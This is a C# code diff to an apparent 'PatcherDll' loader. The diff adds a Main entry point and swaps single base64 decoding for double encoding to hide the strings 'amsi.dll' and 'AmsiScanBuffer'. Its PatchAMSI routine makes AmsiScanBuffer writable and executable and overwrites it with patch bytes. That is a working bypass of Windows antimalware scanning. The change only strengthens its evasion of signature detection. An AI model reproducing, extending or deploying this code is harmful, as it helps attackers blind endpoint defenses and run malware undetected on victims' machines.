@@ -11,6 +11,11 @@ namespace EntryPoint
 {
     public class Entry
     {
+        static void Main(string[] args)
+        {
+            Start();
+        }
+
         public static void Start()
         {
             //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} Running PatcherDll{Environment.NewLine}");
@@ -37,17 +42,45 @@ namespace EntryPoint
             }
         }
 
-        static string dec(string enc)
+        //static string dec(string enc)
+        //{
+        //    byte[] b = Convert.FromBase64String(enc);
+        //    return Encoding.UTF8.GetString(b);
+        //}
+
+        static string Dec(string enc, int times)
         {
-            byte[] b = Convert.FromBase64String(enc);
-            return Encoding.UTF8.GetString(b);
+            string result = enc;
+
+            for (int i = 0; i < times; i++)
+            {
+                byte[] bytes = Convert.FromBase64String(result);
+                result = Encoding.UTF8.GetString(bytes);
+            }
+
+            return result;
+        }
+
+        static string Enc(string text, int times)
+        {
+            string result = text;
+
+            for (int i = 0; i < times; i++)
+            {
+                byte[] bytes = Encoding.UTF8.GetBytes(result);
+                result = Convert.ToBase64String(bytes);
+            }
+
+            return result;
         }
 
         static void PatchAMSI()
         {
+            //var enc = Enc("amsi.dll", 2);
+            //enc = Enc("AmsiScanBuffer", 2);
 
-            var lib = LoadLibrary(dec("YW1zaS5kbGw="));
-            var asb = GetProcAddress(lib, dec("QW1zaVNjYW5CdWZmZXI="));
+            var lib = LoadLibrary(Dec("WVcxemFTNWtiR3c9", 2));
+            var asb = GetProcAddress(lib, Dec("UVcxemFWTmpZVzVDZFdabVpYST0=", 2));
             var patch = GetPatch;
             _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
             Marshal.Copy(patch, 0, asb, patch.Length);
